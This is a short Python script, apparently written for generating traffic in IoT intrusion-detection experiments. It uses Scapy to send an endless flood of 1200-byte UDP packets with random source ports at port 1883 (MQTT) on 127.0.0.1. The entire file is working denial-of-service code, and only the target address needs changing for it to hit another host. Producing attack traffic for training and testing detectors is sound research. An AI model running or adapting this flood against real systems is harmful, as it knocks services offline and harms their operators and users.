# UDP Flood attack script
# Purpose: Generate malicious UDP traffic for IoT intrusion detection experiments
# Academic use only


from scapy.all import IP, UDP, Raw, send
import random

# Target configuration
target_ip = "127.0.0.1"
target_port = 1883

print(f"🔥 Lancement de l'attaque UDP Flood sur {target_ip}:{target_port}")

while True:
    pkt = (
        IP(dst=target_ip)
        / UDP(
            sport=random.randint(10000, 60000),
            dport=target_port
        )
        / Raw(load="X" * 1200)
    )
    send(pkt, verbose=False)
